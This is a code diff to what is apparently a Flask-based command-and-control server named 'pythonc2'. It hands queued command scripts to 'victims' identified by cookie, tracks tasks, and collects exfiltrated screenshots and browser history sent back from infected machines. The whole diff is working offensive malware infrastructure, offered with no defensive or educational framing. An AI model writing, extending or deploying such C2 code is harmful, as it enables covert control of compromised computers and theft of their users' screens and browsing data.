@@ -31,8 +31,9 @@ def main(myclient):
 
 	def handle_commands(cmd_object):
 		cmd = cmd_object['command']
+		task_id = cmd_object['task_id']
 
-		language = 'powershell'
+		language = 'python'
 		utility = 'collection'
 
 		## Send command script to victim
@@ -43,30 +44,30 @@ def main(myclient):
 
 		f = open(module_path, "r")
 		script = f.read()
-		return {'cmd': cmd, 'language': language, 'script': script}
+		return {'task_id': task_id, 'language': language, 'cmd': cmd, 'script': script}
 		
-
+	def insert_cmd_output(output,victim_id,task_id):
+		mydb = myclient["pythonc2"]
+		cmds = mydb["commands"]
+		h = {'victim_id':victim_id,'task_id':task_id}
+		cmds.find_one_and_update(h,{ "$set": { "output": output } })
 
 	@app.route('/',methods = ['GET', 'POST'])
 	def run():
 		if request.method == 'GET':
 			mydb = myclient["pythonc2"]
 			cmds = mydb["commands"]
-			x = cmds.find_one()
+			
 			victim_id = get_cookie(request)
+			## Finding only the commands for this victim id and which hasn't been issued yet
+			x = cmds.find({'victim_id': victim_id, 'issued':False})
 
-
-			if x:
-				if 'sample' in x:
-					cmds.delete_one(x)
-					x = cmds.find_one()
-
-				elif 'command' in x and x['victim_id'] == victim_id:
-					# cmd = x['command']
-					# cmds.delete_one(x)
-					script = handle_commands(x)
-					cmds.delete_one(x)
-					return script
+			for cmd in x:
+				script = handle_commands(cmd)
+				h = {'victim_id':cmd['victim_id'],'task_id':cmd['task_id']}
+				cmds.find_one_and_update(h,{ "$set": { "issued": True } })
+				return script
+					
 
 			if victim_id:
 				update_last_seen(mydb,victim_id)
@@ -88,8 +89,10 @@ def main(myclient):
 			return "OK"
 
 	## Task output handler
-	@app.route('/<cmd>/output',methods = ['POST'])
-	def task_output(cmd):
+	@app.route('/<cmd>/output/<task_id>',methods = ['POST'])
+
+
+	def task_output(cmd,task_id):
 		if request.method == 'POST':
 			victim_id = get_cookie(request)
 
@@ -98,11 +101,26 @@ def main(myclient):
 				if not os.path.exists(dump_path):
 					os.makedirs(dump_path)
 				
+
+				b64encoded_string = request.data
+				decoded_string = base64.b64decode(b64encoded_string)
+				ss_path = os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png")
 				## wb enables to write bianry
-				with open(os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png"), "wb") as f:
+				with open(ss_path, "wb") as f:
 					# Write bytes to file
-					f.write(request.data)
+					f.write(decoded_string)
 				f.close()
+
+				output = 'Screeshot saved to '+ss_path
+			elif cmd == 'browser_history':
+				## Comes as a bytes object, so changing to string
+				output = request.data.decode('utf-8')
+			else:
+				## Not a valid cmd,, Do something?? TODO
+				pass
+			
+			insert_cmd_output(output,victim_id,task_id)
+
 			return "OK"
 
 		
